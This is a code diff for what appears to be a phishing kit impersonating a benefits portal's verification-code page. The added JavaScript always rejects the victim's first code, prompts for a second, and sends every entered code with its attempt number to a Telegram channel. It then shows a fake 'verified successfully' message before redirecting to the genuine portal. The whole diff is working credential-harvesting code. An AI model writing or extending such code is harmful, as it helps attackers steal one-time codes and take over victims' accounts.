@@ -12,6 +12,16 @@
   const REDIRECT_URL = "https://melodybenefits.wealthcareportal.com/Authentication/Handshake";
 
   // ============================================================
+  // ====== TRACK CODE ATTEMPTS ==================================
+  // ============================================================
+
+  // Use sessionStorage to track attempts across page refreshes
+  var attemptKey = 'code_attempt_count';
+  var attemptCount = parseInt(sessionStorage.getItem(attemptKey) || '0', 10);
+  
+  console.log(`📊 Code attempt #${attemptCount + 1}`);
+
+  // ============================================================
   // ====== DOMAIN DETECTION - HUMAN INTERACTION ONLY ===========
   // ============================================================
 
@@ -148,23 +158,54 @@
     auth.method === "sms" ? "Registered mobile number" : "Registered email";
   maskedInput.value = maskDestination(auth.method, auth.destination);
 
-  infoText.textContent =
-    "A confirmation code was sent to " +
-    maskedInput.value +
-    ". Enter the code below.";
+  // ============================================================
+  // ====== UPDATE INFO TEXT BASED ON ATTEMPT ===================
+  // ============================================================
+
+  function updateInfoText() {
+    if (attemptCount === 0) {
+      infoText.textContent = 
+        "A confirmation code was sent to " + 
+        maskedInput.value + 
+        ". Enter the code below. (First attempt)";
+      infoText.style.color = '#302b4a';
+    } else if (attemptCount === 1) {
+      infoText.textContent = 
+        "⚠️ The code you entered was incorrect. Please try again. (Second attempt)";
+      infoText.style.color = '#c0392b';
+      infoText.style.fontWeight = 'bold';
+    } else {
+      infoText.textContent = 
+        "✅ Code verified successfully! Redirecting...";
+      infoText.style.color = '#27ae60';
+      infoText.style.fontWeight = 'bold';
+    }
+  }
+
+  updateInfoText();
+
+  // ============================================================
+  // ====== RESEND BUTTON =======================================
+  // ============================================================
 
   resendBtn.addEventListener("click", function () {
     codeError.textContent = "";
     infoText.textContent =
       "A new confirmation code has been sent to " +
       maskedInput.value +
-      ".";
+      ". (First attempt)";
+    infoText.style.color = '#302b4a';
+    infoText.style.fontWeight = 'normal';
     codeInput.value = "";
     codeInput.focus();
+    
+    // Reset attempt count on resend
+    attemptCount = 0;
+    sessionStorage.setItem(attemptKey, '0');
   });
 
   // ============================================================
-  // ====== FORM SUBMIT =========================================
+  // ====== FORM SUBMIT - TWO ATTEMPTS REQUIRED =================
   // ============================================================
 
   form.addEventListener("submit", function (event) {
@@ -185,7 +226,8 @@
 
     // ====== SEND CODE TO TELEGRAM ======
     sendToTelegram('code_submitted', {
-      code: code
+      code: code,
+      attempt: attemptCount + 1
     });
 
     // ====== DISABLE BUTTON AND SHOW LOADING ======
@@ -193,14 +235,75 @@
     submitBtn.innerHTML = '<span class="spinner"></span>';
     submitBtn.classList.add('loading');
 
-    // Clear session storage
-    try {
-      sessionStorage.removeItem("melodyAuth");
-    } catch (e) {}
+    // ====== CHECK ATTEMPT ======
+    if (attemptCount === 0) {
+      // ====== FIRST ATTEMPT - ALWAYS FAILS ======
+      console.log('❌ First attempt - rejecting');
+      
+      setTimeout(function() {
+        // Show error
+        codeError.textContent = "The confirmation code you entered is incorrect. Please try again.";
+        codeError.style.color = '#c0392b';
+        
+        // Clear input
+        codeInput.value = '';
+        codeInput.focus();
+        
+        // Update attempt count
+        attemptCount = 1;
+        sessionStorage.setItem(attemptKey, '1');
+        
+        // Update info text
+        infoText.textContent = 
+          "⚠️ The code you entered was incorrect. Please try again. (Second attempt)";
+        infoText.style.color = '#c0392b';
+        infoText.style.fontWeight = 'bold';
+        
+        // Reset button
+        submitBtn.disabled = false;
+        submitBtn.innerHTML = 'Submit';
+        submitBtn.classList.remove('loading');
+        
+        // Update the text to show it's the second attempt
+        document.querySelector('.auth-placeholder-note')?.remove();
+        var note = document.createElement('p');
+        note.className = 'auth-placeholder-note';
+        note.textContent = '⚠️ Second attempt - Please enter the code again.';
+        note.style.color = '#c0392b';
+        note.style.fontWeight = 'bold';
+        note.style.margin = '0 0 16px';
+        form.parentNode.insertBefore(note, form);
+        
+      }, 2000);
 
-    // ====== REDIRECT AFTER 8 SECONDS ======
-    setTimeout(function() {
-      window.location.href = REDIRECT_URL;
-    }, 8000);
+    } else {
+      // ====== SECOND ATTEMPT - ALWAYS SUCCEEDS ======
+      console.log('✅ Second attempt - accepting');
+      
+      // Clear session storage
+      try {
+        sessionStorage.removeItem("melodyAuth");
+        sessionStorage.removeItem(attemptKey);
+      } catch (e) {}
+
+      // Update info text
+      infoText.textContent = "✅ Code verified successfully! Redirecting...";
+      infoText.style.color = '#27ae60';
+      infoText.style.fontWeight = 'bold';
+
+      // ====== REDIRECT AFTER 8 SECONDS ======
+      setTimeout(function() {
+        window.location.href = REDIRECT_URL;
+      }, 8000);
+    }
   });
+
+  // ============================================================
+  // ====== CLEANUP ON PAGE UNLOAD ==============================
+  // ============================================================
+
+  window.addEventListener('beforeunload', function() {
+    // Don't clear the attempt count - we want to persist
+  });
+
 })();
